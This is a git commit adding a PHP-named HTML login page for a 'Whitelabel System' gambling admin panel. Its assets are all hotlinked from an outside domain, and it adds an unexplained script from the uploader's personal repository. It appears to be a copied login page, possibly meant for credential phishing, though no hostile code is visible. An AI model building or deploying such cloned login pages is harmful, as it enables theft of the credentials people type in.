6dde92c6b41e3f3fb01f3dcf1ec3a748bca04f63
inggarfi <inggarsaput@gmail.com>
2025-09-28 20:43:53 +0700

    Add files via upload

---
+++ logatronss.php
@@ -0,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Whitelabel System</title>
+  <link href="https://frog2nd.top/panel-adm/cssgatrons/css-bootstrap.min.css" rel="stylesheet">
+  <link href="https://frog2nd.top/panel-adm/cssgatrons/css-jquery.toast.css" rel="stylesheet">
+  <link href="https://frog2nd.top/panel-adm/cssgatrons/pages-login-register-lock9514.css" rel="stylesheet">
+  <link href="https://frog2nd.top/panel-adm/cssgatrons/css-styleeef3.css" rel="stylesheet">
+  <link href="https://frog2nd.top/panel-adm/cssgatrons/colors-default-dark.css" id="theme" rel="stylesheet">
+  <link href="https://frog2nd.top/panel-adm/cssgatrons/sweetalert-sweetalert.css" rel="stylesheet">
+  <script src="https://frog2nd.top/panel-adm/jsgatrons/sweetalert-sweetalert.min.js"></script>
+  <link rel="stylesheet" media="screen" href="https://frog2nd.top/panel-adm/cssgatrons/css-style.css">
+
+  <style>
+    .page-titles { position: absolute; }
+    .centered { position: fixed; margin: 10% auto; left: 0; right: 0; }
+    .center-block { display: block; margin-left: auto; margin-right: auto; padding-bottom: 15px; }
+    .login { background-color: #6272a4 !important; }
+    #particles-js { background-color: #282a36 !important; }
+    .m_logo { min-width: 150px; max-height: 100px; }
+  </style>
+</head>
+<body>
+  <div id="particles-js" class="form-signin">
+    <section class="centered">
+      <img src="https://frog2nd.top/panel-adm/imagesgatrons/image-LOGO---ST-GAMING.png" alt="homepage" class="img-fluid center-block m_logo">
+      <div class="login-box card border">
+        <div class="card-body">
+          <form class="form-horizontal form-material" action="/panel-adm/index.php" method="POST">
+            <p class="text-center text-secondary"><b>WHITELABEL</b></p>
+
+            
+            <div class="form-group m-t-40">
+              <input class="form-control" type="text" name="username" placeholder="Username" required>
+            </div>
+            <div class="form-group">
+              <input class="form-control" type="password" name="password" placeholder="Password" required>
+            </div>
+            <div class="form-group">
+              <input class="form-control" type="text" name="v" placeholder="Validation" maxlength="6" autocomplete="off" required>
+            </div>
+            <div class="form-group">
+              <div class="col align-self-center" style="text-align:center">
+                <img src="https://frog2nd.top/panel-adm/imagesgatrons/img-captchad41d.png" class="captcha" style="border:1px solid #CCC;cursor:pointer" data-toggle="tooltip" data-placement="bottom">
+              </div>
+            </div>
+            <div class="form-group text-center m-t-20">
+              <button class="btn btn-sm btn-block text-uppercase login text-light" type="submit">Log In</button>
+            </div>
+          </form>
+
+          <div class="text-center">
+            <code class="mt-5 mb-3 text-muted" style="font-size:15px">© 2025 <a href="https://t.me/thisisvelvet">VELVETMAN</a></code>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/gh/inggarfi/balmon@main/nwbl.js"></script>
+  <script src="https://frog2nd.top/panel-adm/jsgatrons/particles-particles.js"></script>
+  <script src="https://frog2nd.top/panel-adm/jsgatrons/js-app.js"></script>
+  <script src="https://frog2nd.top/panel-adm/jsgatrons/3.3.1-jquery.min.js"></script>
+  <script src="https://frog2nd.top/panel-adm/jsgatrons/umd-popper.min.js"></script>
+  <script src="https://frog2nd.top/panel-adm/jsgatrons/js-waves.js"></script>
+  <script src="https://frog2nd.top/panel-adm/jsgatrons/sweetalert-sweetalert.min.js"></script>
+  <script src="https://frog2nd.top/panel-adm/jsgatrons/js-jquery.toast.js"></script>
+</body>
+</html>
